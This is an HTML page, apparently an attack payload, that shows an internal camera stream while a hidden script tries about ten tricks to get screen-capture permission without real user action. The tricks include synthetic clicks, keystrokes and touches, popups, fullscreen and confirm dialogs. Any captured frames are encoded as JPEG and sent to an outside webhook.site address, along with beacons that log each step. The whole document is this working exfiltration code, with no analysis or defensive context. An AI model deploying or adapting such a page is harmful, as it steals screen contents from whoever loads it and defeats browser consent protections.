<!DOCTYPE html>
<html>
<head><title>C</title></head>
<body style="margin:0;background:#111;">
<img id="cam" src="http://10.133.7.5/stream" style="width:640px;height:480px;display:block;">
<script>
var W='https://webhook.site/2c352a24-311b-4255-b02a-c77dbec3c3fe';
function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
rpt('ALIVE','1');

var gdmDone=false;
function ua(){return navigator.userActivation?navigator.userActivation.isActive+'/'+navigator.userActivation.hasBeenActive:'?'}

function tryGDM(label){
    if(gdmDone)return;
    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia)return;
    rpt('GDM_TRY',label+'|ua='+ua());
    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
        if(gdmDone)return;gdmDone=true;
        rpt('GDM_OK',label+'|tracks='+s.getTracks().length);
        processStream(s);
    }).catch(function(e){
        rpt('GDM_E',label+'|'+e.name.substring(0,20));
    });
}

// === APPROACH 1: window.open triggers activation? ===
setTimeout(function(){
    if(gdmDone)return;
    rpt('A1_PRE',ua());
    try{
        var w=window.open('about:blank','_blank','width=1,height=1');
        rpt('A1_POPUP','opened|ua='+ua());
        if(w)w.close();
        tryGDM('a1_popup');
    }catch(e){rpt('A1_E',e.message)}
},500);

// === APPROACH 2: window.open then GDM inside timeout ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        var w=window.open('about:blank');
        if(w){
            rpt('A2_POPUP','ua='+ua());
            w.close();
            setTimeout(function(){tryGDM('a2_delayed')},100);
        }
    }catch(e){}
},2000);

// === APPROACH 3: Multiple rapid synthetic events + GDM ===
setTimeout(function(){
    if(gdmDone)return;
    var el=document.createElement('div');
    el.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%';
    document.body.appendChild(el);
    // Fire rapid mouse events
    el.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,pointerId:1,pointerType:'mouse',isPrimary:true}));
    el.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,pointerId:1,pointerType:'mouse',isPrimary:true}));
    el.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,button:0}));
    el.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,button:0}));
    el.dispatchEvent(new MouseEvent('click',{bubbles:true,button:0}));
    rpt('A3_EVENTS','ua='+ua());
    tryGDM('a3_events');
},3000);

// === APPROACH 4: focus + keyboard events ===
setTimeout(function(){
    if(gdmDone)return;
    var inp=document.createElement('input');
    inp.type='text';
    inp.style.cssText='position:fixed;top:0;left:0;opacity:0.01';
    document.body.appendChild(inp);
    inp.focus();
    inp.dispatchEvent(new KeyboardEvent('keydown',{key:'a',code:'KeyA',keyCode:65,bubbles:true}));
    inp.dispatchEvent(new KeyboardEvent('keypress',{key:'a',code:'KeyA',keyCode:65,bubbles:true}));
    inp.dispatchEvent(new KeyboardEvent('keyup',{key:'a',code:'KeyA',keyCode:65,bubbles:true}));
    rpt('A4_KEYS','ua='+ua());
    tryGDM('a4_keys');
},4000);

// === APPROACH 5: Touch events ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        var el=document.body;
        el.dispatchEvent(new TouchEvent('touchstart',{bubbles:true,touches:[new Touch({identifier:1,target:el})]}));
        el.dispatchEvent(new TouchEvent('touchend',{bubbles:true,changedTouches:[new Touch({identifier:1,target:el})]}));
        rpt('A5_TOUCH','ua='+ua());
        tryGDM('a5_touch');
    }catch(e){rpt('A5_E',e.message)}
},5000);

// === APPROACH 6: Notification.requestPermission ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        Notification.requestPermission().then(function(p){
            rpt('A6_NOTIF',p+'|ua='+ua());
            tryGDM('a6_notif');
        });
    }catch(e){rpt('A6_E',e.message)}
},6000);

// === APPROACH 7: Create trusted event via Selection API ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        // Select text and copy - might trigger activation
        var el=document.createElement('textarea');
        el.value='test';
        document.body.appendChild(el);
        el.select();
        var result=document.execCommand('selectAll');
        rpt('A7_SELECT',result+'|ua='+ua());
        // Try paste/copy
        result=document.execCommand('copy');
        rpt('A7_COPY',result+'|ua='+ua());
        tryGDM('a7_copy');
    }catch(e){rpt('A7_E',e.message)}
},7000);

// === APPROACH 8: alert/confirm/prompt (blocked in headless but might trigger activation) ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        // confirm() might trigger activation even if auto-dismissed
        var r=confirm('x');
        rpt('A8_CONFIRM',r+'|ua='+ua());
        tryGDM('a8_confirm');
    }catch(e){rpt('A8_E',e.message)}
},8000);

// === APPROACH 9: requestFullscreen ===
setTimeout(function(){
    if(gdmDone)return;
    try{
        document.body.requestFullscreen().then(function(){
            rpt('A9_FS','ok|ua='+ua());
            tryGDM('a9_fs');
        }).catch(function(e){
            rpt('A9_FS_E',e.message+'|ua='+ua());
            tryGDM('a9_fs_fail');
        });
    }catch(e){rpt('A9_E',e.message)}
},9000);

// === APPROACH 10: Direct GDM retries every 5s ===
var retryN=0;
function retryGDM(){
    retryN++;
    if(gdmDone||retryN>10)return;
    tryGDM('retry'+retryN);
    setTimeout(retryGDM,5000);
}
retryGDM();

function processStream(stream){
    rpt('STREAM','tracks='+stream.getTracks().length);
    stream.getTracks().forEach(function(t,i){
        rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
    });
    var v=document.createElement('video');
    v.srcObject=stream;v.autoplay=true;v.muted=true;
    v.style.cssText='width:800px;height:600px;display:block';
    document.body.appendChild(v);
    v.onloadeddata=function(){
        rpt('VID',v.videoWidth+'x'+v.videoHeight);
        doGrab(v,stream,'ld0');
        setTimeout(function(){doGrab(v,stream,'ld1')},1000);
        setTimeout(function(){doGrab(v,stream,'ld3')},3000);
    };
    setTimeout(function(){doGrab(v,stream,'t1')},500);
    setTimeout(function(){doGrab(v,stream,'t3')},3000);
    setTimeout(function(){doGrab(v,stream,'t10')},10000);
}

var grabN=0;
function doGrab(v,stream,label){
    grabN++;if(grabN>8)return;
    var w=v.videoWidth||1600,h=v.videoHeight||900;
    rpt('GRAB',label+'|'+w+'x'+h+'|rdy='+v.readyState);
    if(w<=0||h<=0)return;
    var c=document.createElement('canvas');c.width=w;c.height=h;
    var ctx=c.getContext('2d');
    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',label+'|'+e.message);return}
    try{
        var d=ctx.getImageData(0,0,20,1);
        var px=Array.from(d.data);
        var nz=px.filter(function(x){return x>0}).length;
        rpt('PX',label+'|nz='+nz+'|'+px.slice(0,40).join(','));
    }catch(e){rpt('PX_E',label+'|'+e.message)}
    try{
        var du=c.toDataURL('image/jpeg',0.7);
        rpt('DU',label+'|len='+du.length);
        if(du.length>1000){
            try{navigator.sendBeacon(W,label+':'+du)}catch(e){}
            fetch(W,{method:'POST',mode:'no-cors',body:label+':'+du}).catch(function(){});
        }
    }catch(e){rpt('DU_E',label+'|'+e.message)}
}
</script>
</body>
</html>
